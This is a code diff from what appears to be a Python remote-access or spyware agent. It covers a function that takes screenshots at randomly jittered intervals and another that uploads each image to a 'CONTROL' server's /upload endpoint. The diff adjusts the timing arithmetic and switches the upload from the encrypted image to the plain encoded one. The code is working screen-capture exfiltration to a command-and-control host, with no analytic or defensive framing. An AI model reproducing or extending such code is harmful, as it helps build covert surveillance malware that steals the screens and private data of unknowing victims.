@@ -27,7 +27,7 @@ def handle_screenshot(message):
 def screenshot_looper(interval, count):
     try:
         buffer = interval * 0.15
-        adjusted = random.randint((interval-buffer) * 100, (interval+buffer)*100) / 100
+        adjusted = int(random.randint(int(interval-buffer) * 100, int(interval+buffer)*100) / 100)
         for _ in range(count):
             handle_screenshot_helper(False)
             time.sleep(adjusted)
@@ -44,7 +44,7 @@ def handle_screenshot_helper(alone=True):
         encrypted_image = eu.encrypt(encoded_image)
 
         filename = f'{datetime.now().strftime("%d-%b-%Y %H-%M-%S-%f")}.png'
-        r = requests.post(f"{CONTROL}/upload", files={'image': (filename, encrypted_image, 'image/png')})
+        r = requests.post(f"{CONTROL}/upload", files={'image': (filename, encoded_image, 'image/png')})
         if alone: return "Successfully sent screenshot"
     except Exception as e:
         if alone: return f"{e} : Failed to send screenshot"
